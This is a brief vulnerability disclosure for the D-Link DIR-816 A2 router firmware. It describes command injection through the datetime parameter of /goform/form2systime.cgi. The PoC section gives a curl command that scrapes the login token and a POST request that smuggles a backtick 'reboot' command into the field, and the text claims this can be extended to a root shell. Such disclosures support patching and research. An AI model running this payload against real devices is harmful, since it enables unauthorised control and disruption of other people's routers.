
# D-link DIR-816 A2_v1.10CNB04.img Command injection vulnerability

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/form2systime_cgi/img/vuln1.png)

In /goform/form2systime.cgi, the Command injection vulnerability only needs to be met by datetime -:

## Poc

First you need to get the tokenid

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Next, run the following poc, you can see that the router is restarted

```python
curl -i -X POST http://192.168.0.1/goform/form2systime.cgi -d tokenid=xxxxx -d 'datetime=`reboot`-:'
```

Finally, exp can be written to achieve the effect of obtaining a root shell
